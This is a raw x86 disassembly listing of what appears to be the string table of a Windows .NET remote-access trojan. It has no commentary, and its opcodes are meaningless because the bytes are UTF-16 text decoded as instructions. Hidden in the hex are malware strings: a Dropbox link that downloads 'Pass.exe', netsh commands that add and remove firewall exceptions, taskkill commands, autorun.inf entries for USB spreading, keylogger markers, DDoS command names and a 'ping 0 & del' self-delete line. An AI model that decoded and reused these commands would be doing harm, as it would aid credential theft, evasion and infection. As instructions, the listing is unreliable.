  409b34:	67 00 65 00          	add    %ah,0x0(%di)
  409b38:	72 00                	jb     0x409b3a
  409b3a:	00 15 43 00 75 00    	add    %dl,0x750043
  409b40:	72 00                	jb     0x409b42
  409b42:	73 00                	jae    0x409b44
  409b44:	6f                   	outsl  %ds:(%esi),(%dx)
  409b45:	00 72 00             	add    %dh,0x0(%edx)
  409b48:	53                   	push   %ebx
  409b49:	00 68 00             	add    %ch,0x0(%eax)
  409b4c:	6f                   	outsl  %ds:(%esi),(%dx)
  409b4d:	00 77 00             	add    %dh,0x0(%edi)
  409b50:	00 15 43 00 75 00    	add    %dl,0x750043
  409b56:	72 00                	jb     0x409b58
  409b58:	73 00                	jae    0x409b5a
  409b5a:	6f                   	outsl  %ds:(%esi),(%dx)
  409b5b:	00 72 00             	add    %dh,0x0(%edx)
  409b5e:	48                   	dec    %eax
  409b5f:	00 69 00             	add    %ch,0x0(%ecx)
  409b62:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  409b66:	00 1b                	add    %bl,(%ebx)
  409b68:	73 00                	jae    0x409b6a
  409b6a:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  409b6e:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
  409b72:	75 00                	jne    0x409b74
  409b74:	73 00                	jae    0x409b76
  409b76:	69 00 63 00 70 00    	imul   $0x700063,(%eax),%eax
  409b7c:	6c                   	insb   (%dx),%es:(%edi)
  409b7d:	00 61 00             	add    %ah,0x0(%ecx)
  409b80:	79 00                	jns    0x409b82
  409b82:	00 11                	add    %dl,(%ecx)
  409b84:	4f                   	dec    %edi
  409b85:	00 70 00             	add    %dh,0x0(%eax)
  409b88:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  409b8c:	53                   	push   %ebx
  409b8d:	00 69 00             	add    %ch,0x0(%ecx)
  409b90:	74 00                	je     0x409b92
  409b92:	65 00 00             	add    %al,%gs:(%eax)
  409b95:	07                   	pop    %es
  409b96:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
  409b9a:	73 00                	jae    0x409b9c
  409b9c:	00 07                	add    %al,(%edi)
  409b9e:	75 00                	jne    0x409ba0
  409ba0:	64 00 70 00          	add    %dh,%fs:0x0(%eax)
  409ba4:	00 0d 75 00 64 00    	add    %cl,0x640075
  409baa:	70 00                	jo     0x409bac
  409bac:	73 00                	jae    0x409bae
  409bae:	74 00                	je     0x409bb0
  409bb0:	70 00                	jo     0x409bb2
  409bb2:	00 11                	add    %dl,(%ecx)
  409bb4:	70 00                	jo     0x409bb6
  409bb6:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  409bbc:	73 00                	jae    0x409bbe
  409bbe:	74 00                	je     0x409bc0
  409bc0:	6f                   	outsl  %ds:(%esi),(%dx)
  409bc1:	00 70 00             	add    %dh,0x0(%eax)
  409bc4:	00 31                	add    %dh,(%ecx)
  409bc6:	74 00                	je     0x409bc8
  409bc8:	61                   	popa
  409bc9:	00 73 00             	add    %dh,0x0(%ebx)
  409bcc:	6b 00 6b             	imul   $0x6b,(%eax),%eax
  409bcf:	00 69 00             	add    %ch,0x0(%ecx)
  409bd2:	6c                   	insb   (%dx),%es:(%edi)
  409bd3:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  409bd7:	00 2f                	add    %ch,(%edi)
  409bd9:	00 46 00             	add    %al,0x0(%esi)
  409bdc:	20 00                	and    %al,(%eax)
  409bde:	2f                   	das
  409bdf:	00 49 00             	add    %cl,0x0(%ecx)
  409be2:	4d                   	dec    %ebp
  409be3:	00 20                	add    %ah,(%eax)
  409be5:	00 50 00             	add    %dl,0x0(%eax)
  409be8:	49                   	dec    %ecx
  409be9:	00 4e 00             	add    %cl,0x0(%esi)
  409bec:	47                   	inc    %edi
  409bed:	00 2e                	add    %ch,(%esi)
  409bef:	00 45 00             	add    %al,0x0(%ebp)
  409bf2:	58                   	pop    %eax
  409bf3:	00 45 00             	add    %al,0x0(%ebp)
  409bf6:	00 05 6c 00 6c 00    	add    %al,0x6c006c
  409bfc:	00 05 6b 00 6c 00    	add    %al,0x6c006b
  409c02:	00 07                	add    %al,(%edi)
  409c04:	70 00                	jo     0x409c06
  409c06:	61                   	popa
  409c07:	00 73 00             	add    %dh,0x0(%ebx)
  409c0a:	00 09                	add    %cl,(%ecx)
  409c0c:	74 00                	je     0x409c0e
  409c0e:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  409c12:	70 00                	jo     0x409c14
  409c14:	00 13                	add    %dl,(%ebx)
  409c16:	2f                   	das
  409c17:	00 70 00             	add    %dh,0x0(%eax)
  409c1a:	61                   	popa
  409c1b:	00 73 00             	add    %dh,0x0(%ebx)
  409c1e:	73 00                	jae    0x409c20
  409c20:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  409c24:	78 00                	js     0x409c26
  409c26:	65 00 00             	add    %al,%gs:(%eax)
  409c29:	6d                   	insl   (%dx),%es:(%edi)
  409c2a:	68 00 74 00 74       	push   $0x74007400
  409c2f:	00 70 00             	add    %dh,0x0(%eax)
  409c32:	73 00                	jae    0x409c34
  409c34:	3a 00                	cmp    (%eax),%al
  409c36:	2f                   	das
  409c37:	00 2f                	add    %ch,(%edi)
  409c39:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  409c3d:	00 2e                	add    %ch,(%esi)
  409c3f:	00 64 00 72          	add    %ah,0x72(%eax,%eax,1)
  409c43:	00 6f 00             	add    %ch,0x0(%edi)
  409c46:	70 00                	jo     0x409c48
  409c48:	62 00                	bound  %eax,(%eax)
  409c4a:	6f                   	outsl  %ds:(%esi),(%dx)
  409c4b:	00 78 00             	add    %bh,0x0(%eax)
  409c4e:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  409c52:	6f                   	outsl  %ds:(%esi),(%dx)
  409c53:	00 6d 00             	add    %ch,0x0(%ebp)
  409c56:	2f                   	das
  409c57:	00 73 00             	add    %dh,0x0(%ebx)
  409c5a:	2f                   	das
  409c5b:	00 70 00             	add    %dh,0x0(%eax)
  409c5e:	38 00                	cmp    %al,(%eax)
  409c60:	34 00                	xor    $0x0,%al
  409c62:	61                   	popa
  409c63:	00 61 00             	add    %ah,0x0(%ecx)
  409c66:	7a 00                	jp     0x409c68
  409c68:	32 00                	xor    (%eax),%al
  409c6a:	38 00                	cmp    %al,(%eax)
  409c6c:	74 00                	je     0x409c6e
  409c6e:	30 00                	xor    %al,(%eax)
  409c70:	68 00 65 00 70       	push   $0x70006500
  409c75:	00 75 00             	add    %dh,0x0(%ebp)
  409c78:	6c                   	insb   (%dx),%es:(%edi)
  409c79:	00 2f                	add    %ch,(%edi)
  409c7b:	00 50 00             	add    %dl,0x0(%eax)
  409c7e:	61                   	popa
  409c7f:	00 73 00             	add    %dh,0x0(%ebx)
  409c82:	73 00                	jae    0x409c84
  409c84:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  409c88:	78 00                	js     0x409c8a
  409c8a:	65 00 3f             	add    %bh,%gs:(%edi)
  409c8d:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  409c91:	00 3d 00 30 00 00    	add    %bh,0x3000
  409c97:	13 2f                	adc    (%edi),%ebp
  409c99:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  409c9d:	00 6d 00             	add    %ch,0x0(%ebp)
  409ca0:	70 00                	jo     0x409ca2
  409ca2:	2e 00 74 00 78       	add    %dh,%cs:0x78(%eax,%eax,1)
  409ca7:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  409cab:	09 70 00             	or     %esi,0x0(%eax)
  409cae:	72 00                	jb     0x409cb0
  409cb0:	6f                   	outsl  %ds:(%esi),(%dx)
  409cb1:	00 66 00             	add    %ah,0x0(%esi)
  409cb4:	00 03                	add    %al,(%ebx)
  409cb6:	7e 00                	jle    0x409cb8
  409cb8:	00 03                	add    %al,(%ebx)
  409cba:	21 00                	and    %eax,(%eax)
  409cbc:	00 11                	add    %dl,(%ecx)
  409cbe:	67 00 65 00          	add    %ah,0x0(%di)
  409cc2:	74 00                	je     0x409cc4
  409cc4:	76 00                	jbe    0x409cc6
  409cc6:	61                   	popa
  409cc7:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  409ccb:	00 65 00             	add    %ah,0x0(%ebp)
  409cce:	00 03                	add    %al,(%ebx)
  409cd0:	40                   	inc    %eax
  409cd1:	00 00                	add    %al,(%eax)
  409cd3:	05 72 00 6e 00       	add    $0x6e0072,%eax
  409cd8:	00 07                	add    %al,(%edi)
  409cda:	4d                   	dec    %ebp
  409cdb:	00 53 00             	add    %dl,0x0(%ebx)
  409cde:	47                   	inc    %edi
  409cdf:	00 00                	add    %al,(%eax)
  409ce1:	1b 45 00             	sbb    0x0(%ebp),%eax
  409ce4:	78 00                	js     0x409ce6
  409ce6:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  409cea:	75 00                	jne    0x409cec
  409cec:	74 00                	je     0x409cee
  409cee:	65 00 20             	add    %ah,%gs:(%eax)
  409cf1:	00 45 00             	add    %al,0x0(%ebp)
  409cf4:	52                   	push   %edx
  409cf5:	00 52 00             	add    %dl,0x0(%edx)
  409cf8:	4f                   	dec    %edi
  409cf9:	00 52 00             	add    %dl,0x0(%edx)
  409cfc:	00 07                	add    %al,(%edi)
  409cfe:	62 00                	bound  %eax,(%eax)
  409d00:	6c                   	insb   (%dx),%es:(%edi)
  409d01:	00 61 00             	add    %ah,0x0(%ecx)
  409d04:	00 1d 44 00 6f 00    	add    %bl,0x6f0044
  409d0a:	77 00                	ja     0x409d0c
  409d0c:	6e                   	outsb  %ds:(%esi),(%dx)
  409d0d:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  409d11:	00 61 00             	add    %ah,0x0(%ecx)
  409d14:	64 00 20             	add    %ah,%fs:(%eax)
  409d17:	00 45 00             	add    %al,0x0(%ebp)
  409d1a:	52                   	push   %edx
  409d1b:	00 52 00             	add    %dl,0x0(%edx)
  409d1e:	4f                   	dec    %edi
  409d1f:	00 52 00             	add    %dl,0x0(%edx)
  409d22:	00 03                	add    %al,(%ebx)
  409d24:	2e 00 00             	add    %al,%cs:(%eax)
  409d27:	19 45 00             	sbb    %eax,0x0(%ebp)
  409d2a:	78 00                	js     0x409d2c
  409d2c:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  409d30:	75 00                	jne    0x409d32
  409d32:	74 00                	je     0x409d34
  409d34:	65 00 64 00 20       	add    %ah,%gs:0x20(%eax,%eax,1)
  409d39:	00 41 00             	add    %al,0x0(%ecx)
  409d3c:	73 00                	jae    0x409d3e
  409d3e:	20 00                	and    %al,(%eax)
  409d40:	00 1d 45 00 78 00    	add    %bl,0x780045
  409d46:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  409d4a:	75 00                	jne    0x409d4c
  409d4c:	74 00                	je     0x409d4e
  409d4e:	65 00 20             	add    %ah,%gs:(%eax)
  409d51:	00 45 00             	add    %al,0x0(%ebp)
  409d54:	52                   	push   %edx
  409d55:	00 52 00             	add    %dl,0x0(%edx)
  409d58:	4f                   	dec    %edi
  409d59:	00 52 00             	add    %dl,0x0(%edx)
  409d5c:	20 00                	and    %al,(%eax)
  409d5e:	00 07                	add    %al,(%edi)
  409d60:	69 00 6e 00 76 00    	imul   $0x76006e,(%eax),%eax
  409d66:	00 05 70 00 6c 00    	add    %al,0x6c0070
  409d6c:	00 03                	add    %al,(%ebx)
  409d6e:	41                   	inc    %ecx
  409d6f:	00 00                	add    %al,(%eax)
  409d71:	03 68 00             	add    0x0(%eax),%ebp
  409d74:	00 03                	add    %al,(%ebx)
  409d76:	70 00                	jo     0x409d78
  409d78:	00 07                	add    %al,(%edi)
  409d7a:	6f                   	outsl  %ds:(%esi),(%dx)
  409d7b:	00 73 00             	add    %dh,0x0(%ebx)
  409d7e:	6b 00 00             	imul   $0x0,(%eax),%eax
  409d81:	0b 73 00             	or     0x0(%ebx),%esi
  409d84:	74 00                	je     0x409d86
  409d86:	61                   	popa
  409d87:	00 72 00             	add    %dh,0x0(%edx)
  409d8a:	74 00                	je     0x409d8c
  409d8c:	00 07                	add    %al,(%edi)
  409d8e:	4f                   	dec    %edi
  409d8f:	00 66 00             	add    %ah,0x0(%esi)
  409d92:	66 00 00             	data16 add %al,(%eax)
  409d95:	07                   	pop    %es
  409d96:	6f                   	outsl  %ds:(%esi),(%dx)
  409d97:	00 66 00             	add    %ah,0x0(%esi)
  409d9a:	66 00 00             	data16 add %al,(%eax)
  409d9d:	07                   	pop    %es
  409d9e:	72 00                	jb     0x409da0
  409da0:	65 00 74 00 00       	add    %dh,%gs:0x0(%eax,%eax,1)
  409da5:	05 47 00 54 00       	add    $0x540047,%eax
  409daa:	00 07                	add    %al,(%edi)
  409dac:	43                   	inc    %ebx
  409dad:	00 41 00             	add    %al,0x0(%ecx)
  409db0:	50                   	push   %eax
  409db1:	00 00                	add    %al,(%eax)
  409db3:	05 75 00 6e 00       	add    $0x6e0075,%eax
  409db8:	00 05 75 00 70 00    	add    %al,0x700075
  409dbe:	00 19                	add    %bl,(%ecx)
  409dc0:	55                   	push   %ebp
  409dc1:	00 70 00             	add    %dh,0x0(%eax)
  409dc4:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  409dc8:	74 00                	je     0x409dca
  409dca:	65 00 20             	add    %ah,%gs:(%eax)
  409dcd:	00 45 00             	add    %al,0x0(%ebp)
  409dd0:	52                   	push   %edx
  409dd1:	00 52 00             	add    %dl,0x0(%edx)
  409dd4:	4f                   	dec    %edi
  409dd5:	00 52 00             	add    %dl,0x0(%edx)
  409dd8:	00 09                	add    %cl,(%ecx)
  409dda:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  409dde:	78 00                	js     0x409de0
  409de0:	65 00 00             	add    %al,%gs:(%eax)
  409de3:	19 55 00             	sbb    %edx,0x0(%ebp)
  409de6:	70 00                	jo     0x409de8
  409de8:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  409dec:	74 00                	je     0x409dee
  409dee:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  409df4:	20 00                	and    %al,(%eax)
  409df6:	54                   	push   %esp
  409df7:	00 6f 00             	add    %ch,0x0(%edi)
  409dfa:	20 00                	and    %al,(%eax)
  409dfc:	00 05 2e 00 2e 00    	add    %al,0x2e002e
  409e02:	00 1b                	add    %bl,(%ebx)
  409e04:	55                   	push   %ebp
  409e05:	00 70 00             	add    %dh,0x0(%eax)
  409e08:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  409e0c:	74 00                	je     0x409e0e
  409e0e:	65 00 20             	add    %ah,%gs:(%eax)
  409e11:	00 45 00             	add    %al,0x0(%ebp)
  409e14:	52                   	push   %edx
  409e15:	00 52 00             	add    %dl,0x0(%edx)
  409e18:	4f                   	dec    %edi
  409e19:	00 52 00             	add    %dl,0x0(%edx)
  409e1c:	20 00                	and    %al,(%eax)
  409e1e:	00 05 45 00 78 00    	add    %al,0x780045
  409e24:	00 07                	add    %al,(%edi)
  409e26:	50                   	push   %eax
  409e27:	00 4c 00 47          	add    %cl,0x47(%eax,%eax,1)
  409e2b:	00 00                	add    %al,(%eax)
  409e2d:	07                   	pop    %es
  409e2e:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  409e34:	00 03                	add    %al,(%ebx)
  409e36:	48                   	dec    %eax
  409e37:	00 00                	add    %al,(%eax)
  409e39:	03 50 00             	add    0x0(%eax),%edx
  409e3c:	00 03                	add    %al,(%ebx)
  409e3e:	63 00                	arpl   %eax,(%eax)
  409e40:	00 05 45 00 52 00    	add    %al,0x520045
  409e46:	00 03                	add    %al,(%ebx)
  409e48:	5f                   	pop    %edi
  409e49:	00 00                	add    %al,(%eax)
  409e4b:	05 3f 00 3f 00       	add    $0x3f003f,%eax
  409e50:	00 11                	add    %dl,(%ecx)
  409e52:	79 00                	jns    0x409e54
  409e54:	79 00                	jns    0x409e56
  409e56:	2d 00 4d 00 4d       	sub    $0x4d004d00,%eax
  409e5b:	00 2d 00 64 00 64    	add    %ch,0x64006400
  409e61:	00 01                	add    %al,(%ecx)
  409e63:	11 3f                	adc    %edi,(%edi)
  409e65:	00 3f                	add    %bh,(%edi)
  409e67:	00 2d 00 3f 00 3f    	add    %ch,0x3f003f00
  409e6d:	00 2d 00 3f 00 3f    	add    %ch,0x3f003f00
  409e73:	00 01                	add    %al,(%ecx)
  409e75:	13 4d 00             	adc    0x0(%ebp),%ecx
  409e78:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  409e7e:	6f                   	outsl  %ds:(%esi),(%dx)
  409e7f:	00 73 00             	add    %dh,0x0(%ebx)
  409e82:	6f                   	outsl  %ds:(%esi),(%dx)
  409e83:	00 66 00             	add    %ah,0x0(%esi)
  409e86:	74 00                	je     0x409e88
  409e88:	00 0f                	add    %cl,(%edi)
  409e8a:	57                   	push   %edi
  409e8b:	00 69 00             	add    %ch,0x0(%ecx)
  409e8e:	6e                   	outsb  %ds:(%esi),(%dx)
  409e8f:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  409e93:	00 77 00             	add    %dh,0x0(%edi)
  409e96:	73 00                	jae    0x409e98
  409e98:	00 07                	add    %al,(%edi)
  409e9a:	57                   	push   %edi
  409e9b:	00 69 00             	add    %ch,0x0(%ecx)
  409e9e:	6e                   	outsb  %ds:(%esi),(%dx)
  409e9f:	00 00                	add    %al,(%eax)
  409ea1:	03 ae 00 01 03 22    	add    0x22030100(%esi),%ebp
  409ea7:	21 01                	and    %eax,(%ecx)
  409ea9:	05 20 00 20 00       	add    $0x200020,%eax
  409eae:	00 03                	add    %al,(%ebx)
  409eb0:	20 00                	and    %al,(%eax)
  409eb2:	00 09                	add    %cl,(%ecx)
  409eb4:	20 00                	and    %al,(%eax)
  409eb6:	57                   	push   %edi
  409eb7:	00 69 00             	add    %ch,0x0(%ecx)
  409eba:	6e                   	outsb  %ds:(%esi),(%dx)
  409ebb:	00 00                	add    %al,(%eax)
  409ebd:	05 53 00 50 00       	add    $0x500053,%eax
  409ec2:	00 07                	add    %al,(%edi)
  409ec4:	78 00                	js     0x409ec6
  409ec6:	38 00                	cmp    %al,(%eax)
  409ec8:	36 00 00             	add    %al,%ss:(%eax)
  409ecb:	09 20                	or     %esp,(%eax)
  409ecd:	00 78 00             	add    %bh,0x0(%eax)
  409ed0:	36 00 34 00          	add    %dh,%ss:(%eax,%eax,1)
  409ed4:	00 09                	add    %cl,(%ecx)
  409ed6:	20 00                	and    %al,(%eax)
  409ed8:	78 00                	js     0x409eda
  409eda:	38 00                	cmp    %al,(%eax)
  409edc:	36 00 00             	add    %al,%ss:(%eax)
  409edf:	07                   	pop    %es
  409ee0:	59                   	pop    %ecx
  409ee1:	00 65 00             	add    %ah,0x0(%ebp)
  409ee4:	73 00                	jae    0x409ee6
  409ee6:	00 05 4e 00 6f 00    	add    %al,0x6f004e
  409eec:	00 47 6e             	add    %al,0x6e(%edi)
  409eef:	00 65 00             	add    %ah,0x0(%ebp)
  409ef2:	74 00                	je     0x409ef4
  409ef4:	73 00                	jae    0x409ef6
  409ef6:	68 00 20 00 66       	push   $0x66002000
  409efb:	00 69 00             	add    %ch,0x0(%ecx)
  409efe:	72 00                	jb     0x409f00
  409f00:	65 00 77 00          	add    %dh,%gs:0x0(%edi)
  409f04:	61                   	popa
  409f05:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  409f09:	00 20                	add    %ah,(%eax)
  409f0b:	00 61 00             	add    %ah,0x0(%ecx)
  409f0e:	64 00 64 00 20       	add    %ah,%fs:0x20(%eax,%eax,1)
  409f13:	00 61 00             	add    %ah,0x0(%ecx)
  409f16:	6c                   	insb   (%dx),%es:(%edi)
  409f17:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  409f1b:	00 77 00             	add    %dh,0x0(%edi)
  409f1e:	65 00 64 00 70       	add    %ah,%gs:0x70(%eax,%eax,1)
  409f23:	00 72 00             	add    %dh,0x0(%edx)
  409f26:	6f                   	outsl  %ds:(%esi),(%dx)
  409f27:	00 67 00             	add    %ah,0x0(%edi)
  409f2a:	72 00                	jb     0x409f2c
  409f2c:	61                   	popa
  409f2d:	00 6d 00             	add    %ch,0x0(%ebp)
  409f30:	20 00                	and    %al,(%eax)
  409f32:	22 00                	and    (%eax),%al
  409f34:	00 07                	add    %al,(%edi)
  409f36:	22 00                	and    (%eax),%al
  409f38:	20 00                	and    %al,(%eax)
  409f3a:	22 00                	and    (%eax),%al
  409f3c:	00 11                	add    %dl,(%ecx)
  409f3e:	22 00                	and    (%eax),%al
  409f40:	20 00                	and    %al,(%eax)
  409f42:	45                   	inc    %ebp
  409f43:	00 4e 00             	add    %cl,0x0(%esi)
  409f46:	41                   	inc    %ecx
  409f47:	00 42 00             	add    %al,0x0(%edx)
  409f4a:	4c                   	dec    %esp
  409f4b:	00 45 00             	add    %al,0x0(%ebp)
  409f4e:	00 03                	add    %al,(%ebx)
  409f50:	22 00                	and    (%eax),%al
  409f52:	00 09                	add    %cl,(%ecx)
  409f54:	22 00                	and    (%eax),%al
  409f56:	20 00                	and    %al,(%eax)
  409f58:	2e 00 2e             	add    %ch,%cs:(%esi)
  409f5b:	00 00                	add    %al,(%eax)
  409f5d:	21 74 00 61          	and    %esi,0x61(%eax,%eax,1)
  409f61:	00 73 00             	add    %dh,0x0(%ebx)
  409f64:	6b 00 6b             	imul   $0x6b,(%eax),%eax
  409f67:	00 69 00             	add    %ch,0x0(%ecx)
  409f6a:	6c                   	insb   (%dx),%es:(%edi)
  409f6b:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  409f6f:	00 2f                	add    %ch,(%edi)
  409f71:	00 46 00             	add    %al,0x0(%esi)
  409f74:	20 00                	and    %al,(%eax)
  409f76:	2f                   	das
  409f77:	00 49 00             	add    %cl,0x0(%ecx)
  409f7a:	4d                   	dec    %ebp
  409f7b:	00 20                	add    %ah,(%eax)
  409f7d:	00 00                	add    %al,(%eax)
  409f7f:	17                   	pop    %ss
  409f80:	61                   	popa
  409f81:	00 75 00             	add    %dh,0x0(%ebp)
  409f84:	74 00                	je     0x409f86
  409f86:	6f                   	outsl  %ds:(%esi),(%dx)
  409f87:	00 72 00             	add    %dh,0x0(%edx)
  409f8a:	75 00                	jne    0x409f8c
  409f8c:	6e                   	outsb  %ds:(%esi),(%dx)
  409f8d:	00 2e                	add    %ch,(%esi)
  409f8f:	00 69 00             	add    %ch,0x0(%ecx)
  409f92:	6e                   	outsb  %ds:(%esi),(%dx)
  409f93:	00 66 00             	add    %ah,0x0(%esi)
  409f96:	00 13                	add    %dl,(%ebx)
  409f98:	5b                   	pop    %ebx
  409f99:	00 61 00             	add    %ah,0x0(%ecx)
  409f9c:	75 00                	jne    0x409f9e
  409f9e:	74 00                	je     0x409fa0
  409fa0:	6f                   	outsl  %ds:(%esi),(%dx)
  409fa1:	00 72 00             	add    %dh,0x0(%edx)
  409fa4:	75 00                	jne    0x409fa6
  409fa6:	6e                   	outsb  %ds:(%esi),(%dx)
  409fa7:	00 5d 00             	add    %bl,0x0(%ebp)
  409faa:	00 0b                	add    %cl,(%ebx)
  409fac:	6f                   	outsl  %ds:(%esi),(%dx)
  409fad:	00 70 00             	add    %dh,0x0(%eax)
  409fb0:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  409fb4:	3d 00 00 1b 73       	cmp    $0x731b0000,%eax
  409fb9:	00 68 00             	add    %ch,0x0(%eax)
  409fbc:	65 00 6c 00 6c       	add    %ch,%gs:0x6c(%eax,%eax,1)
  409fc1:	00 65 00             	add    %ah,0x0(%ebp)
  409fc4:	78 00                	js     0x409fc6
  409fc6:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  409fca:	75 00                	jne    0x409fcc
  409fcc:	74 00                	je     0x409fce
  409fce:	65 00 3d 00 00 05 64 	add    %bh,%gs:0x64050000
  409fd5:	00 69 00             	add    %ch,0x0(%ecx)
  409fd8:	00 07                	add    %al,(%edi)
  409fda:	61                   	popa
  409fdb:	00 63 00             	add    %ah,0x0(%ebx)
  409fde:	74 00                	je     0x409fe0
  409fe0:	00 05 78 00 32 00    	add    %al,0x320078
  409fe6:	00 0b                	add    %cl,(%ebx)
  409fe8:	63 00                	arpl   %eax,(%eax)
  409fea:	6c                   	insb   (%dx),%es:(%edi)
  409feb:	00 65 00             	add    %ah,0x0(%ebp)
  409fee:	61                   	popa
  409fef:	00 72 00             	add    %dh,0x0(%edx)
  409ff2:	00 03                	add    %al,(%ebx)
  409ff4:	00 00                	add    %al,(%eax)
  409ff6:	01 4d 6e             	add    %ecx,0x6e(%ebp)
  409ff9:	00 65 00             	add    %ah,0x0(%ebp)
  409ffc:	74 00                	je     0x409ffe
  409ffe:	73 00                	jae    0x40a000
  40a000:	68 00 20 00 66       	push   $0x66002000
  40a005:	00 69 00             	add    %ch,0x0(%ecx)
  40a008:	72 00                	jb     0x40a00a
  40a00a:	65 00 77 00          	add    %dh,%gs:0x0(%edi)
  40a00e:	61                   	popa
  40a00f:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40a013:	00 20                	add    %ah,(%eax)
  40a015:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40a019:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  40a01d:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40a021:	00 20                	add    %ah,(%eax)
  40a023:	00 61 00             	add    %ah,0x0(%ecx)
  40a026:	6c                   	insb   (%dx),%es:(%edi)
  40a027:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  40a02b:	00 77 00             	add    %dh,0x0(%edi)
  40a02e:	65 00 64 00 70       	add    %ah,%gs:0x70(%eax,%eax,1)
  40a033:	00 72 00             	add    %dh,0x0(%edx)
  40a036:	6f                   	outsl  %ds:(%esi),(%dx)
  40a037:	00 67 00             	add    %ah,0x0(%edi)
  40a03a:	72 00                	jb     0x40a03c
  40a03c:	61                   	popa
  40a03d:	00 6d 00             	add    %ch,0x0(%ebp)
  40a040:	20 00                	and    %al,(%eax)
  40a042:	22 00                	and    (%eax),%al
  40a044:	00 11                	add    %dl,(%ecx)
  40a046:	53                   	push   %ebx
  40a047:	00 6f 00             	add    %ch,0x0(%edi)
  40a04a:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  40a04f:	00 61 00             	add    %ah,0x0(%ecx)
  40a052:	72 00                	jb     0x40a054
  40a054:	65 00 00             	add    %al,%gs:(%eax)
  40a057:	33 63 00             	xor    0x0(%ebx),%esp
  40a05a:	6d                   	insl   (%dx),%es:(%edi)
  40a05b:	00 64 00 2e          	add    %ah,0x2e(%eax,%eax,1)
  40a05f:	00 65 00             	add    %ah,0x0(%ebp)
  40a062:	78 00                	js     0x40a064
  40a064:	65 00 20             	add    %ah,%gs:(%eax)
  40a067:	00 2f                	add    %ch,(%edi)
  40a069:	00 6b 00             	add    %ch,0x0(%ebx)
  40a06c:	20 00                	and    %al,(%eax)
  40a06e:	70 00                	jo     0x40a070
  40a070:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40a076:	20 00                	and    %al,(%eax)
  40a078:	30 00                	xor    %al,(%eax)
  40a07a:	20 00                	and    %al,(%eax)
  40a07c:	26 00 20             	add    %ah,%es:(%eax)
  40a07f:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40a083:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  40a087:	00 22                	add    %ah,(%edx)
  40a089:	00 00                	add    %al,(%eax)
  40a08b:	11 22                	adc    %esp,(%edx)
  40a08d:	00 20                	add    %ah,(%eax)
  40a08f:	00 26                	add    %ah,(%esi)
  40a091:	00 20                	add    %ah,(%eax)
  40a093:	00 65 00             	add    %ah,0x0(%ebp)
  40a096:	78 00                	js     0x40a098
  40a098:	69 00 74 00 00 09    	imul   $0x9000074,(%eax),%eax
  40a09e:	5b                   	pop    %ebx
  40a09f:	00 6b 00             	add    %ch,0x0(%ebx)
  40a0a2:	6c                   	insb   (%dx),%es:(%edi)
  40a0a3:	00 5d 00             	add    %bl,0x0(%ebp)
  40a0a6:	00 07                	add    %al,(%edi)
  40a0a8:	0d 00 0a 00 01       	or     $0x1000a00,%eax
  40a0ad:	00 01                	add    %al,(%ecx)
  40a0af:	13 79 00             	adc    0x0(%ecx),%edi
  40a0b2:	79 00                	jns    0x40a0b4
  40a0b4:	2f                   	das
  40a0b5:	00 4d 00             	add    %cl,0x0(%ebp)
  40a0b8:	4d                   	dec    %ebp
  40a0b9:	00 2f                	add    %ch,(%edi)
  40a0bb:	00 64 00 64          	add    %ah,0x64(%eax,%eax,1)
  40a0bf:	00 20                	add    %ah,(%eax)
  40a0c1:	00 00                	add    %al,(%eax)
  40a0c3:	07                   	pop    %es
  40a0c4:	01 00                	add    %eax,(%eax)
  40a0c6:	0d 00 0a 00 01       	or     $0x1000a00,%eax
  40a0cb:	03 5b 00             	add    0x0(%ebx),%ebx
  40a0ce:	00 03                	add    %al,(%ebx)
  40a0d0:	5d                   	pop    %ebp
  40a0d1:	00 00                	add    %al,(%eax)
  40a0d3:	13 5b 00             	adc    0x0(%ebx),%ebx
  40a0d6:	45                   	inc    %ebp
  40a0d7:	00 4e 00             	add    %cl,0x0(%esi)
  40a0da:	54                   	push   %esp
  40a0db:	00 45 00             	add    %al,0x0(%ebp)
  40a0de:	52                   	push   %edx
  40a0df:	00 5d 00             	add    %bl,0x0(%ebp)
  40a0e2:	0d 00 0a 00 00       	or     $0xa00,%eax
  40a0e7:	0f 5b 00             	cvtdq2ps (%eax),%xmm0
  40a0ea:	54                   	push   %esp
